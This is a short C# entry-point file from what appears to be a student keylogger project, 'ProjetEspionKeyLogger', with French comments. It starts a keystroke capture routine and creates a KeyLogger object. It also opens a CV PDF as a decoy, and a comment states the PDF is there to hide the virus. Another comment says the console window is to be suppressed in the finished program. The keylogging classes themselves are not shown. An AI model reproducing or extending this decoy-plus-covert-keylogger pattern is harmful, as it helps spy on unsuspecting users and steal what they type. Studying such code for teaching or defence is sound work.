using System;
using System.Windows.Forms;
using System.Diagnostics;

namespace ProjetEspionKeyLogger
{
    class Program
    {
        static void Main(string[] args)
        {
            //Test de la fonction
            Enregistrement.Capture();

            //Ligne a supprimer la console ne devra surtout pas s'afficher une fois le progamme créé
            Console.WriteLine("Hello World!");

            //Génere un document PDF pour dissimuler le virus
            var pdf = new Process();
            //Passe en parametre le chemin du document
            pdf.StartInfo = new ProcessStartInfo(@"C:/Users/Charlie/OneDrive/Etudes/M2 OPSIE/CV/CV_Camenen.pdf")
            {UseShellExecute = true};
            //Ouverture du pdf
            pdf.Start();


            //création de l'objet KeyLogger
            KeyLogger key_logger = new KeyLogger();
            Console.WriteLine("FIN!");
        }
    }
}
